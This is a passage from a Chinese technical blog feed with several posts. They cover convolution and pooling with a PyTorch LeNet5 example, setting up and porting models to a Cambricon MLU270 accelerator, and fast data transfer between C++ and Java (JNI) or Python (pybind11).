  计算代码如下：
def corr2d(X, K): #@save
    """计算⼆维互相关运算。"""
    h, w = K.shape
    Y = np.zeros((X.shape[0] - h + 1, X.shape[1] - w + 1))

    for i in range(Y.shape[0]):
        for j in range(Y.shape[1]):
            Y[i, j] = (X[i:i + h, j:j + w] * K).sum()
            
    return Y

_X = np.ones((6, 8))
_X[0:2, 2:6] = 0
_X[3:, 2:6] = 0
print(_X)
_K = np.array([[1.0, -1.0]])
_Y = corr2d(_X, _K)
print(_Y)
_Y = corr2d(_X, _K.T)
print(_Y)
  结果如图：

    
        
    
    
  我们可以分别的看到，图像边缘的数值在经过我们手动构造的滤波器后，成功的检测到边缘信息。
  在实际情况中，我们可能要学习边缘，角点等等特征，这个时候我们不可能手动去构造我们的滤波器，那么我们可不可以通过学习的方式把滤波器学习出来呢？下面通过实例来演示：
_X = np.ones((6, 8))
_X[0:2, 2:6] = 0
_X[3:, 2:6] = 0
print(_X)
_K = np.array([[1.0, -1.0]])
_Y = corr2d(_X, _K)
print(_Y)
# _Y = corr2d(_X, _K.T)
# print(_Y)

X = torch.from_numpy(_X)
X.requires_grad = True
X = X.to(dtype=torch.float32)
X = X.reshape(1, 1, 6, 8)

Y = torch.from_numpy(_Y)
Y.requires_grad = True

conv2d = torch.nn.Conv2d(1, 1, (1, 2), bias=False)

for i in range(20):
    y_train = conv2d(X)
    l = (y_train - Y)**2

    conv2d.zero_grad()

    # print(l.shape)
    l.backward(torch.ones_like(l))

    
    # print(conv2d.weight)
    with torch.no_grad():
        # print('grad = ', conv2d.weight.grad)
        conv2d.weight[:] -= 0.02 * conv2d.weight.grad
    # print(conv2d.weight)
    # print(conv2d.weight.shape)
    if (i + 1) % 2 == 0:
        print(f'batch &#123;i+1&#125;, loss &#123;float(l.sum()):.3f&#125;')

print(conv2d.weight)
  结果如图：

    
        
    

  我们通过corr2d函数构造出特征Y，然后我们通过训练特征Y，我们可以看到最终卷积层的权重就是接近与1和-1，恰好等于我们构造的特殊滤波器。
  这个实例说明了，我们可以通过学习的方式来学习出一个我们想要的滤波器，不需要手动构造。
  此外卷积还有卷积核、步长、填充等等资料，我就不造轮子了，网上有很多大佬写的很好的，大家去看看。此外这里有个公式非常有用：N=(W-K+2P)/S+1。




池化

  我们在上文知道了卷积的输出结果代表了一片上下左右数据的关联性，比如一个像素和之前的9个像素有关联，比如一个$99$的图，经过一个卷积后，假如还是$99$，这个时候输出的$99$里面的每个像素我们已经和之前对应位置的一片像素建立了关联。但是某些时候，我们希望这种关联性聚合起来，通过求最大值或者平均等等，这就是池化的概念。以之前例子为例：卷积输出了$99$的像素，经过池化之后，假如变成了$33$，我们可以看到池化输出的每个像素代表之前卷积输出的$33$个像素，这代表我们的信息聚集了，因为一个像素代表了上一层的多个像素。
  注意池化，我们还可以从视野的角度来看待，还是和上面的例子一样，假如原图上的猫是$99$的像素，经过卷积池化之后，假如变成了$33$， 这意味着我们从像素的角度来说，之前81个像素代表猫，现在9个像素就可以代表了，也就是之前的一个像素和现在的一个像素代表的原图视野不一样了，形成了视野放大的感觉。但是有一个缺点就是，这可能导致小目标丢失了，这个在目标检测里面会关注到。




一个经典神经网络LeNet5

  在2017年12月份，我的这篇文章中《LeNet-5 论文及原理分析(笨鸟角度)》 （ https://blog.csdn.net/u011728480/article/details/78799672 ）其实当时我为了学习一些基本知识，也对LeNet5的论文中网络结构部分做了细致的分析。
  注意本文中的C3层和论文中的C3层不一样。本文的C3层是$166(55+1) = 2496$个参数。论文原文是$6(355+1)+6*(455+1)+3*(455+1)+1* (655+1)=1516$个参数。
  训练代码如下：
import numpy as np
from numpy.lib.utils import lookfor
import torch

from torchvision.transforms import ToTensor
import os
import torch
from torch import nn
from torch.nn.modules import activation
from torch.nn.modules import linear
from torch.nn.modules.linear import Linear
from torch.utils.data import DataLoader
from torchvision import datasets, transforms

import visdom

vis = visdom.Visdom(env='main')

title = 'LeNet5 on ' + 'FashionMNIST'
legend = ['TrainLoss', 'TestLoss', 'TestAcc']

epoch_plot_window = vis.line(        
        X=torch.zeros((1, 3)).cpu(),
        Y=torch.zeros((1, 3)).cpu(),
        win='epoch_win',
        opts=dict(
            xlabel='Epoch',
            ylabel='Loss/Acc',
            title=title,
            legend=legend
        ))

def corr2d(X, W): #@save
    """计算⼆维互相关运算。"""
    h, w = W.shape
    Y = np.zeros((X.shape[0] - h + 1, X.shape[1] - w + 1))

    for i in range(Y.shape[0]):
        for j in range(Y.shape[1]):
            Y[i, j] = (X[i:i + h, j:j + w] * W).sum()
            
    return Y


def TrainConv2d():
    _X = np.ones((6, 8))
    _X[0:2, 2:6] = 0
    _X[3:, 2:6] = 0
    print(_X)
    _K = np.array([[1.0, -1.0]])
    _Y = corr2d(_X, _K)
    print(_Y)
    # _Y = corr2d(_X, _K.T)
    # print(_Y)

    X = torch.from_numpy(_X)
    X.requires_grad = True
    X = X.to(dtype=torch.float32)
    X = X.reshape(1, 1, 6, 8)

    Y = torch.from_numpy(_Y)
    Y.requires_grad = True

    conv2d = torch.nn.Conv2d(1, 1, (1, 2), bias=False)
    
    for i in range(20):
        y_train = conv2d(X)
        l = (y_train - Y)**2

        conv2d.zero_grad()

        # print(l.shape)
        l.backward(torch.ones_like(l))

        
        # print(conv2d.weight)
        with torch.no_grad():
            # print('grad = ', conv2d.weight.grad)
            conv2d.weight[:] -= 0.02 * conv2d.weight.grad
        # print(conv2d.weight)
        # print(conv2d.weight.shape)
        if (i + 1) % 2 == 0:
            print(f'batch &#123;i+1&#125;, loss &#123;float(l.sum()):.3f&#125;')
    
    print(conv2d.weight)


class NeuralNetwork(nn.Module):
    def __init__(self):
        super(NeuralNetwork, self).__init__()
        self.lenet5 = nn.Sequential(
            # 6*28*28---->6*28*28
            nn.Conv2d(1, 6, (5, 5), stride=1, padding=2),
            nn.Sigmoid(),

            # 6*28*28----->6*14*14
            nn.AvgPool2d((2, 2), stride=2, padding=0),

            # 6*14*14----->16*10*10
            nn.Conv2d(6, 16, (5, 5), stride=1),
            nn.Sigmoid(),

            # 16*10*10------>16*5*5
            nn.AvgPool2d((2, 2), stride=2, padding=0),
            
            nn.Flatten(),

            nn.Linear(16*5*5, 1*120),
            nn.Sigmoid(),

            nn.Linear(1*120, 1*84),
            nn.Sigmoid(),

            nn.Linear(1*84, 1*10)
        )

    def forward(self, x):
        logits = self.lenet5(x)
        return logits


def LoadFashionMNISTByTorchApi():
    # 60000*28*28
    training_data = datasets.FashionMNIST(
        root="..\data",
        train=True,
        download=True,
        transform=ToTensor()
    )

    # 10000*28*28
    test_data = datasets.FashionMNIST(
        root="..\data",
        train=False,
        download=True,
        transform=ToTensor()
    )

    # labels_map = &#123;
    #     0: "T-Shirt",
    #     1: "Trouser",
    #     2: "Pullover",
    #     3: "Dress",
    #     4: "Coat",
    #     5: "Sandal",
    #     6: "Shirt",
    #     7: "Sneaker",
    #     8: "Bag",
    #     9: "Ankle Boot",
    # &#125;
    # figure = plt.figure(figsize=(8, 8))
    # cols, rows = 3, 3
    # for i in range(1, cols * rows + 1):
    #     sample_idx = torch.randint(len(training_data), size=(1,)).item()
    #     img, label = training_data[sample_idx]
    #     figure.add_subplot(rows, cols, i)
    #     plt.title(labels_map[label])
    #     plt.axis("off")
    #     plt.imshow(img.squeeze(), cmap="gray")
    # plt.show()
    return training_data, test_data


def train_loop(dataloader, model, loss_fn, optimizer):
    size = len(dataloader.dataset)
    num_batches = len(dataloader)
    loss_sum = 0
    for batch, (X, y) in enumerate(dataloader):
        # move X, y to gpu
        if torch.cuda.is_available():
            X = X.to('cuda')
            y = y.to('cuda')
        # Compute prediction and loss
        pred = model(X)
        loss = loss_fn(pred, y)

        # Backpropagation
        optimizer.zero_grad()
        loss.backward()
        optimizer.step()

        loss_sum += loss.item()
        if batch % 100 == 0:
            loss1, current = loss.item(), batch * len(X)
            print(f"loss: &#123;loss1:>7f&#125;  [&#123;current:>5d&#125;/&#123;size:>5d&#125;]")

    return loss_sum/num_batches

def test_loop(dataloader, model, loss_fn):
    size = len(dataloader.dataset)
    num_batches = len(dataloader)
    test_loss, correct = 0, 0

    with torch.no_grad():
        for X, y in dataloader:
            # move X, y to gpu
            if torch.cuda.is_available():
                X = X.to('cuda')
                y = y.to('cuda')
            pred = model(X)
            test_loss += loss_fn(pred, y).item()
            correct += (pred.argmax(1) == y).type(torch.float).sum().item()

    test_loss /= num_batches
    correct /= size
    print(f"Test Error: \n Accuracy: &#123;(100*correct):>0.1f&#125;%, Avg loss: &#123;test_loss:>8f&#125; \n")

    return test_loss, correct

if __name__ == '__main__':
    # TrainConv2d()

    device = 'cuda' if torch.cuda.is_available() else 'cpu'
    print('Using &#123;&#125; device'.format(device))

    def init_weights(m):
        if type(m) == nn.Linear or type(m) == nn.Conv2d:
            nn.init.xavier_uniform_(m.weight)

    model = NeuralNetwork()
    model.apply(init_weights)
    model = model.to(device)
    print(model)
    
    batch_size = 200
    learning_rate = 0.9
    
    
    training_data, test_data = LoadFashionMNISTByTorchApi()
    train_dataloader = DataLoader(training_data, batch_size, shuffle=True)
    test_dataloader = DataLoader(test_data, batch_size, shuffle=True)
    loss_fn = nn.CrossEntropyLoss()
    optimizer = torch.optim.SGD(model.parameters(), lr=learning_rate)

    epochs = 1000

    model.train()
    for t in range(epochs):
        print(f"Epoch &#123;t+1&#125;\n-------------------------------")
        train_loss = train_loop(train_dataloader, model, loss_fn, optimizer)
        test_loss, test_acc = test_loop(test_dataloader, model, loss_fn)

        vis.line(np.array([train_loss, test_loss, test_acc]).reshape(1, 3), 
            np.ones((1, 3))*t, 
            win='epoch_win', 
            update=None if t == 0 else 'append', 
            opts=dict(
                xlabel='Epoch',
                ylabel='Loss/Acc',
                title=title,
                legend=legend
            )
        )
    print("Done!")

    # only save param
    torch.save(model.state_dict(), 'lenet5.pth')

    # save param and net
    torch.save(model, 'lenet5-all.pth')

    # export onnx
    input_image = torch.zeros((1,1,28,28))
    input_image = input_image.to(device)
    torch.onnx.export(model, input_image, 'model.onnx')

  结果如图：

    
        
    
    
  我们从训练可视化界面上可以看到，我们的模型确实是收敛了，但是不幸的是准确率大概有90%左右，而且存在过拟合现象。注意这里我们这个模型，由于有Sigmoid层，导致了很容易出现梯度消失的情况，为了加快训练，所以学习率设置的很大。




后记

  整理本系列的基础知识的原因是需要加深对深度学习的理解。同时跟着参考资料，重复试验，重复运行。对我个人而言，只有真实的写了代码之后，才能够理解的更加透彻。
  本文也是此系列的终篇，以后更新随缘。
参考文献


https://github.com/d2l-ai/d2l-zh/releases (V1.0.0)


https://github.com/d2l-ai/d2l-zh/releases (V2.0.0 alpha1)


https://blog.csdn.net/u011728480/article/details/78799672 （《LeNet-5 论文及原理分析(笨鸟角度)》）







    
        
        打赏、订阅、收藏、丢香蕉、硬币，请关注公众号（攻城狮的搬砖之路）
    


    
        
    


PS: 请尊重原创，不喜勿喷。
PS: 要转载请注明出处，本人版权所有。
PS: 有问题请留言，看到后我会第一时间回复。
]]></content>
      <categories>
        <category>DL</category>
        <category>计算机视觉</category>
      </categories>
      <tags>
        <tag>卷积和池化</tag>
      </tags>
  </entry>
  <entry>
    <title>寒武纪加速平台(MLU200系列) 摸鱼指南（二）--- 模型移植-环境搭建</title>
    <url>/2021/11/14/blog_idx_112/</url>
    <content><![CDATA[ 
PS：要转载请注明出处，本人版权所有。
PS: 这个只是基于《我自己》的理解，如果和你的原则及想法相冲突，请谅解，勿喷。

环境说明


Ubuntu 18.04


MLU270 加速卡一张


前言

  阅读本文前，请务必须知以下前置文章概念：


《寒武纪加速平台(MLU200系列) 摸鱼指南（一）— 基本概念及相关介绍》 （ https://blog.csdn.net/u011728480/article/details/121194076 ）


  前文我们已经介绍一些基本的概念。在本文，将会从安装加速卡，到模型环境移植搭建完成，都会做一个简单的介绍。
  若文中引用部分存在侵权，请及时联系我删除。




安装MLU270加速卡到主机

  首先MLU270加速卡你可以直接把他看为一张普通的独立显卡就行。只需要安装在主机的PCIE x16 口即可，并连接好供电线，其供电线是特制的接口，需要官方提供的线缆进行转换一下接口。其官网渲染图如图：

    
        
    
    
  开机后通过查看pcie设备即可发现刚刚安装的设备（lspci命令）：

    
        
    
    




安装驱动

  根据其官网资料（ https://www.cambricon.com/docs/driver/index.html ），我简要说明部分内容。
  首先根据其资料，我们可以看到大概支持两个系列的os，一个是ubuntu/debian，一个是centos。这里，我建议使用ubuntu，具体原因，有兴趣的可以去查看此文档的注意部分。


在Ubuntu18.04上安装驱动
  首先从你的供应商拿到驱动包，名字如：neuware-mlu270-driver-dkms_xxx_all.deb。然后不用客气，直接执行：sudo dpkg -i neuware-mlu270-driver-dkms_xxx_all.deb。
  我们其实可以看到，其用DKMS来管理驱动，和安装N卡驱动非常类似。具体显示信息，请查看如上官网资料。这里只有一个问题要注意，就是内核版本一定要在其文档说明支持的范围内。
  当安装成功后，执行：cnmon，可以看到一个类似nvidia-smi的信息，包含了加速卡的一些基本信息。

    
        
    
    




安装CNToolKit

  其实和我们前置文章里面讲的软件框架部分，当我们准备好驱动之后，其实下一步就是安装运行时层。运行时层就是CNToolKit，里面包含了好几个模块。其具体介绍请查看其官网： https://www.cambricon.com/docs/cntoolkit/index.html 。
  在CNToolKit模块里面，我接触的最多的就是CNRT，因为这是离线模型推理部分的底层支持部分。也就是说前文我提到的EasyDK就是大部分基于CNRT进行设计的。


在Ubuntu18.04上安装CNToolKit
  官方路子：


sudo dpkg -i cntoolkit_xxx.deb


sudo apt update


sudo apt-get install cnas cncc cncodec cndev cndrv cnlicense cnpapi cnperf cnrt cnrtc cnstudio


  野路子：


解压cntoolkit_xxx.deb。


找到里面的所有deb文件，选择自己需要的，直接解压安装。


注意，野路子在边缘端环境配置的时候、边缘端程序生成的时候有奇效。
  配置相关环境变量：


export NEUWARE_HOME=“/usr/local/neuware”


export PATH=“${NEUWARE_HOME}/bin:${PATH}”


注意，此变量NEUWARE_HOME将会伴随着你移植模型，生成边缘端程序等阶段，需要注意。
  安装好进行测试，执行命令：/usr/local/neuware/bin/cncc --version  得到如图输出：

    
        
    
    




配置模型移植开发环境

  寒武纪官方支持3种常见框架的模型移植，他们分别是caffe/tensorflow/pytorch，他们的官方资料如下：


caffe: https://www.cambricon.com/docs/caffe/index.html


tensorflow: https://www.cambricon.com/docs/tensorflow/user_guide/index.html


pytorch: https://www.cambricon.com/docs/pytorch/index.html


  寒武纪官方支持的环境配置方式有两种，一种是全程手动搭建环境。第二种是docker。
  对于手动搭建环境，这里仁者见仁智者见智，我个人认为新手可以尝试着搭建一次就行，后续还是使用docker。因为手动搭建可以让你更加的了解整个移植工作的流程。以pytorch为例，因为手动搭建，大概包含了安装virtualenv，解压源码，设定NEUWARE_HOME环境，打patch，安装依赖，编译编译生成对应的库，运行单元测试，最终检测即可。
  对于业务开发来说，我建议还是docker来的快点。


搭建模型移植docker环境
  docker的安装我就不说了，自己百度把docker基本环境搭好，能够跑hello-world就行。
  首先我们在寒武纪那里可以拿到对应环境的docker镜像，下载到我们的安装了MLU270的主机电脑。然后执行命令： sudo docker load -i pytorch-xxxx-ubuntu18.04.tar，然后执行sudo docker images 查看你已经导入的image文件。如图：

    
        
    
    
  然后执行寒武纪提供的run脚本即可。根据脚本中的配置，默认会将当期目录映射到docker的/home/share目录。
  当我们第一次进入一个docker环境时，需要执行寒武纪提供的patch脚本（联系供应商），在docker根目录生成一个env_pytorch.sh文件，配设定相关的环境。
  此外，每当我们执行run脚本进入docker后（docker run），每一次都需要执行：cd / &amp;&amp; source env_pytorch.sh 进入pytorch虚拟环境。这个时候执行如下命令，并反馈如图：

    
        
    
    
  使用docker还有一个好处是更新升级方便，更重要的是方便建立多个不同算法移植环境。




后记

  对于寒武纪加速平台来说，我们不要将它视为一个新的事物，可以将它类比为Nvidia的显卡加速平台。加速卡驱动对应n卡驱动。cncc类比nvcc。bang c类比为cuda。更高级的算法推理和训练框架其实底层加速部分就是使用cuda/bang c/cpu-simd来构建的。对于我们用户来说，一般情况下，我们只需要普通的了解pytorch/tensorflow/caffe的api即可。只有当对某些特殊算子需要加速的时候，这个时候你有可能去涉及这些cuda/bang c/cpu-simd。这里寒武纪加速平台根据其提供的一些资料来看，直接在算子里面集成了例如ssd/yolov3/yolov5等目标检测的最后一个解码层，详情见相关文档。
  这里介绍了寒武纪算法移植环境搭建的方法，同时也对整个流程做了一个简要的说明。其实如果你能够和供应商联系上，应该还可以得到一些其他的相关支持和资料。我这里由于一些原因，只引用了其官方公开的内容。
参考文献


《寒武纪加速平台(MLU200系列) 摸鱼指南（一）— 基本概念及相关介绍》 （ https://blog.csdn.net/u011728480/article/details/121194076 ）


https://www.cambricon.com/


其他相关保密资料。







    
        
        打赏、订阅、收藏、丢香蕉、硬币，请关注公众号（攻城狮的搬砖之路）
    


    
        
    


PS: 请尊重原创，不喜勿喷。
PS: 要转载请注明出处，本人版权所有。
PS: 有问题请留言，看到后我会第一时间回复。
]]></content>
      <categories>
        <category>嵌入式</category>
        <category>DL</category>
        <category>常识</category>
      </categories>
      <tags>
        <tag>嵌入式</tag>
        <tag>边缘端</tag>
        <tag>人工智能</tag>
      </tags>
  </entry>
  <entry>
    <title>寒武纪加速平台(MLU200系列) 摸鱼指南（三）--- 模型移植-分割网络实例</title>
    <url>/2021/11/21/blog_idx_113/</url>
    <content><![CDATA[ 
PS：要转载请注明出处，本人版权所有。
PS: 这个只是基于《我自己》的理解，如果和你的原则及想法相冲突，请谅解，勿喷。

环境说明


Ubuntu 18.04


MLU270 加速卡一张


寒武纪Pytorch-Docker移植环境


前言

  阅读本文前，请务必须知以下前置文章概念：


《寒武纪加速平台(MLU200系列) 摸鱼指南（一）— 基本概念及相关介绍》 ( https://blog.csdn.net/u011728480/article/details/121194076 )


《寒武纪加速平台(MLU200系列) 摸鱼指南（二）— 模型移植-环境搭建》 ( https://blog.csdn.net/u011728480/article/details/121320982 )


  经过了前面两篇文章的介绍，我们也对寒武纪加速平台有了一个朴实的了解。为了加深我们对寒武纪平台的理解，我这里将会使用一个分割网络的实例来展示寒武纪平台整个模型移植和部署过程。
  若文中引用部分存在侵权，请及时联系我删除。




实例基本介绍

  这里对这个简单的分割网络做一个简介，这里训练使用的是CamVid数据集。输入是1*3*480*480。输出是480*480。
  这里最终的效果就是分割出输入图片里面的汽车。最终网络效果测试如下图：

    
        
    
    
  这个时候，我们也得到了一个可以用于移植和测试的pth模型文件。




移植模型基本步骤

  其实Pytorch的模型移植还是比较简单的，按照一定流程进行测试即可。我总结的基本流程如下：


在docker里面，跑cpu版本的模型推理代码。


在docker里面，跑cpu版本的量化模型生成代码，同时进行量化模型的测试。


在docker里面，将量化模型转换为离线模型。




在Docker里运行cpu推理代码
  至今为止，根据寒武纪官方文档描述，现在的docker环境里面存在的是pytorch1.3环境，这个可能和主流模型支持的pytorch 1.7+有差异。所以，为了后续工作的顺利展开，我们不要一上来就开始量化模型，先保证模型能够在pytorch 1.3环境能够正常工作。
  当我们训练好模型后，得到pth文件，然后在训练环境里面还会做一个测试pth文件的脚本，判断模型的效果。同理，我们应该将此测试脚本放到移植环境里面再跑一次，一般来说都会多多少少出点问题。
  至今为止，我们遇到过两大类问题，一类为pytorch1.3某些算子不支持，可以更换为其他类似算子，或者自己实现这个算子。第二类为一些版本问题，比如模型保存的格式在pytorch1.6后使用的是zip格式（详情见torch.save api说明注释里面），旧版本要加载模型，需要使用_use_new_zipfile_serialization=False重新存储一下模型文件。
  一般来说，大致的模型转换代码如下：
# 存在一个模型test.pth(zip格式)
# 存在一个获取的模型网络结构类：TestModel
import torch

model = TestModel()
state_dict = torch.load('test.pth', map_location=torch.device('cpu'))
model.load_state_dict(state_dict, strict=True)           

torch.save(model, 'new_test.pth', _use_new_zipfile_serialization=False)
# 得到了旧版本的pth文件。方便pytorch 1.6以下进行加载


在Docker里处理量化模型
  这里有两个步骤，首先是使用寒武纪的pytorch接口生成量化模型，然后对量化模型进行测试。注意，这里生成的量化模型有两种，一种是INT8，一种是INT16，具体怎么选择，根据实际情况。一般来说，分类、分割算法可以尝试直接使用INT8，目标检测需要测试再下结论。此外INT8由于运算量的减少，也意味着推理速度的提升。如果不特殊说明，后续默认采用的是INT8模式。
  此外，还需要说明的是，量化一般是量化卷积、全连接等这些参数量较大的层，其他的模型参数依旧是FP16或者FP32存在。
  首先生成量化模型：
# 存在一个模型new_test.pth(非zip格式)
# 存在一个获取的模型网络结构类：TestModel
import torch
import torch_mlu.core.mlu_quantize as mlu_quantize

model = TestModel()
state_dict = torch.load('new_test.pth', map_location=torch.device('cpu'))
model.load_state_dict(state_dict, False)          
mean=[]
std=[] 
# 注意此接口，这里不使用firstconv优化，它的作用是将归一化放到第一层去一起加速做，但是有些模型的前处理是不需要这样做的，具体信息，请参考寒武纪官方文档。
net_quantization = mlu_quantize.quantize_dynamic_mlu(model, &#123;'mean':mean, 'std':std, 'firstconv':False&#125;, dtype='int8', gen_quant=True)
torch.save(net_quantization.state_dict(), 'test_quantization.pth')

# 得到了INT8的量化模型文件test_quantization.pth
  然后在量化模型上测试，此步骤的内容是验证模型量化之后，使用寒武纪定制的pytorch量化算子能否正常得到结果：
# 存在一个INT8的量化模型文件test_quantization.pth
# 存在一个获取的模型网络结构类：TestModel
import torch_mlu
import torch_mlu.core.mlu_model as ct
import torch_mlu.core.mlu_quantize as mlu_quantize

model = TestModel()
 
# step 1
net = mlu_quantize.quantize_dynamic_mlu(model)
# step 2
net.load_state_dict(torch.load('test_quantization.pth'))
# 这里是
input_data=torch.randn((1,3,480,480))
# step 3
net_mlu = net.to(ct.mlu_device())
input_mlu = input_data.to(ct.mlu_device())
# step 4
output=net_mlu(input_mlu)
print(output.cpu())
# output的shape是480*480
  如果这里量化之后的推理结果都是准确无误的，那么基本证明了模型移植成功了。其实从这里可以看出，这里的mlu其实就可以类比cuda，就可以大致猜想mlu是什么样的存在了。


在Docker里生成离线模型
  在之前的基础上，其实我们很快很方便的就生成了离线模型，不过这里的离线模型同样也有两种，还记得前文说的量化只会量化一些特殊层的参数，而模型中的其他层也是用的FP16或者，FP32,因此，离线模型也具备两种，一种是FP16,一种是FP32。通常来说，一个INT8版本的FP16离线模型是最佳的离线模型。
  生成MLU220离线模型：
# 存在一个INT8的量化模型文件test_quantization.pth
# 存在一个获取的模型网络结构类：TestModel
import torch_mlu
import torch_mlu.core.mlu_model as ct
import torch_mlu.core.mlu_quantize as mlu_quantize

model = TestModel()
 
# step 1
net = mlu_quantize.quantize_dynamic_mlu(model)
# step 2
net.load_state_dict(torch.load('test_quantization.pth'))
# 
input_data=torch.randn((1,3,480,480))
# step 3
net_mlu = net.to(ct.mlu_device())
input_mlu = input_data.to(ct.mlu_device())


# 详细查看文档，一般4
core_number = 4
ct.set_core_number(core_number)
ct.set_core_version('MLU220')
# torch_mlu.core.mlu_model.set_input_format(input_format)
ct.save_as_cambricon('test')


net_trace = torch.jit.trace(net_mlu, input_mlu, check_trace=False)

net_trace(input_mlu) 

torch_mlu.core.mlu_model.save_as_cambricon("")

# 最终，我们得到了test.cambricon 和 test.cambricon_twins。test.cambricon_twins是离线模型的说明文件，包含输入数据格式通道等信息，也包含输出相关的信息。
  到此，我们已经得到了离线模型，也完成了我们模型移植的前面一半的工作。
  此外，如果想得到MLU270的离线模型，也可以将set_core_version参数改为MLU270。如果将模型和输入tensor调用half()之后，就会得到fp16的模型格式，具体参考寒武纪官方文档。
  .cambricon_twins文件有一个重要的作用就是描述离线模型网络是输入输出格式及通道，毕竟我们的网络一般结果对不上，很大的原因都是预处理和后处理的毛病。下面我会给出.cambricon_twins的两个实例，一个是INT8FP32,一个是INT8FP16。

    
        
    
    

    
        
    
    




后记

  模型的移植流程，基本上都是固定的，一旦熟悉之后，其实就不会改了。
  最终一般有6个模型生成，两个INT8和INT16的量化模型。4个离线模型，INT8-FP32，INT8-FP16，INT16-FP32，INT16-FP16。不同的模型对应不同的速度和精度，根据模型实际情况酌情选择。
  注意，寒武纪除了支持Pytorch模型移植外，还支持caffe和tensorflow，因此如果需要转换这些模型，请查看对应文档。
参考文献


《寒武纪加速平台(MLU200系列) 摸鱼指南（一）— 基本概念及相关介绍》 ( https://blog.csdn.net/u011728480/article/details/121194076 )


《寒武纪加速平台(MLU200系列) 摸鱼指南（二）— 模型移植-环境搭建》 ( https://blog.csdn.net/u011728480/article/details/121320982 )


https://www.cambricon.com/


https://www.cambricon.com/docs/pytorch/index.html


其他相关保密资料。







    
        
        打赏、订阅、收藏、丢香蕉、硬币，请关注公众号（攻城狮的搬砖之路）
    


    
        
    


PS: 请尊重原创，不喜勿喷。
PS: 要转载请注明出处，本人版权所有。
PS: 有问题请留言，看到后我会第一时间回复。
]]></content>
      <categories>
        <category>嵌入式</category>
        <category>DL</category>
        <category>常识</category>
      </categories>
      <tags>
        <tag>嵌入式</tag>
        <tag>边缘端</tag>
        <tag>人工智能</tag>
      </tags>
  </entry>
  <entry>
    <title>jvm jni 及 pvm pybind11 大批量数据传输及优化</title>
    <url>/2022/07/03/blog_idx_116/</url>
    <content><![CDATA[ 
PS：要转载请注明出处，本人版权所有。
PS: 这个只是基于《我自己》的理解，如果和你的原则及想法相冲突，请谅解，勿喷。

环境说明


android 手机


linux python环境


前言

  近几个月来，对我来说，发生了许许多多的事情，导致有很多idea，但是都未形成好的文章。最近，趁着这个机会，写一篇。
  由于业务的安排，我们需要在c/c++层与java和python层进行数据交换，数据量有大有小，但是由于我们业务上对这个数据交换的延时有一定的要求，因此有些问题需要我们解决。在我们的实验过程中，我们发现了在常规情况下，在jvm中用新创建ByteArray/FloatArray进行大数据量（6Mb byte/2Mb floats）的传输，时间在5ms/7ms，在pvm中用新创建bytearray大数据量（8Mb byte）的传输，时间在1ms左右。从实验情况来看，我们需要优化jvm中进行大数据量传输的方法。
  我以前写过关于java，python和c/cpp交互的一些文章，感兴趣可以参考。


《C++ 调用 Python 总结(一)》 https://blog.csdn.net/u011728480/article/details/103903612


《java 手动生成jni头文件(JNI静态注册)》 https://blog.csdn.net/u011728480/article/details/87260113


《Android JNI静态和动态注册 、Java Reflect（C或C++层反射和JAVA层反射）、Java 可变参数（JNI实现）》 https://blog.csdn.net/u011728480/article/details/78963494






jvm jni篇

  jni常规大量数据交换方法网上有许多，基本都是如下所示:
  在java往c/cpp返回时，一般都是获取数据的底层地址，然后针对地址操作即可。
jbyteArray array;//or jfloatArray array; passed by jni-func
void * _you_wanted_ptr = env->GetPrimitiveArrayCritical(array, nullptr);

// TODO

env->ReleasePrimitiveArrayCritical(array, _you_wanted_ptr, JNI_ABORT);
  在c/cpp往java传输大量数据时，有两种方式，一种是直接new一个数组，然后返回的方式，一种就是获取java层的数组地址，然后直接修改相关的数据即可。其基本如下所示：
// slow way
int len = xxx;
void * data_ptr = xxx;
jXXXArray array = env->NewXXXArray(len);
env->SetXXXArrayRegion(array, 0, len, (const jXXX *) data_ptr);
return array;

// fast way
jbyteArray array;//or jfloatArray array; passed by jni-func
int len = xxx;
void * data_ptr = xxx;
env->SetXXXArrayRegion(array, 0, len, (const jXXX *) data_ptr);

  这里在使用fast way模式后，在jvm中用进行大数据量（6Mb byte/2Mb floats）的传输，时间在0.88ms/1ms，注意，有使用限制。这里一定要注意多线程安全的问题。




pvm pybind11篇

  在pybind11中，大规模数据传输一般有两种数据结构，一种是py::bytes，一种就是我们常见的numpy数组，特别是在图像处理中，numpy数组是最常见的一种格式。下面，根据这两种方式，分别介绍。


py::bytes 类型传输
  python 层传给c/cpp。
const py::bytes &amp;value;//passed by pybind11-func
Py_ssize_t size = PyBytes_GET_SIZE(value.ptr());
char * ptr = PyBytes_AsString(value.ptr());

//TODO 

  c/cpp 层传给python。
char * buf = xxx;
int len = xxx;
return py::bytes(buf, len);//In pybind11, return to pvm
  注意，在py::bytes中，也有直接修改地址的方式，这里就不提供了（python buffer protocol），有心人自己去研究吧。


numpy数据传输
  这个也有像py::bytes那样创建数组，然后返回的方式，这里就不提供了。这里主要还是演示一下怎么快速在c/cpp中获取numpy数据。其实这里的数据传输也就是直接获取numpy数组地址，基本大差不差。
  c/cpp到python
// python buffer protocol
py::array_t&lt;float, py::array::c_style | py::array::forcecast> &amp;buffer;//passed by pybind11-func
auto buf_info = buffer.unchecked&lt;1>();

char * ptr = (char *)buf_info.data(0)

// set value to ptr(numpy)

// get value from ptr(numpy)

  注意，这里使用到一个叫做python buffer protocol的东西，有兴趣大家可以看看，我在这个上并没有深究。


pybind11中内存管理问题
  在pybind11中，要小心管理内存，特别是注意以下两种调用的区别。根据https://pybind11.readthedocs.io/en/stable/advanced/classes.html#non-public-destructors的说明，我们一般会有两种情况需要选择使用。
// 单例
class MyClass&#123;
    private:
    ~MyClass()&#123;&#125;
&#125;;

// 禁止unique_ptr 调用 析构函数， 所有资源释放需要在cpp侧进行完成。
py::class_&lt;MyClass, std::unique_ptr&lt;MyClass, py::nodelete>>(m, "MyClass")
    .def(py::init&lt;>())


// 一般class
class MyClass&#123;
    public:
    ~MyClass()&#123;&#125;
&#125;;

// unique_ptr 析构时自动调用析构函数，所有资源释放由unique_ptr完成。
py::class_&lt;MyClass, std::unique_ptr&lt;MyClass>>(m, "MyClass")
    .def(py::init&lt;>())





后记

  总的来说，在jvm和pvm中，通过操作固定数组的底层指针，我们可以快速的获取数据和传输数据。但是存在一些现象，例如需要注意一些原子操作和pvm/jvm中数组的生命周期的问题，我这里建议，如果是大规模数据传输，建议直接全局数组，这样保证生命周期问题。
参考文献
[1]https://pybind11.readthedocs.io/en/stable/advanced/classes.html#non-public-destructors





    
        
        打赏、订阅、收藏、丢香蕉、硬币，请关注公众号（攻城狮的搬砖之路）
    


    
        
    


PS: 请尊重原创，不喜勿喷。
PS: 要转载请注明出处，本人版权所有。
PS: 有问题请留言，看到后我会第一时间回复。
]]></content>
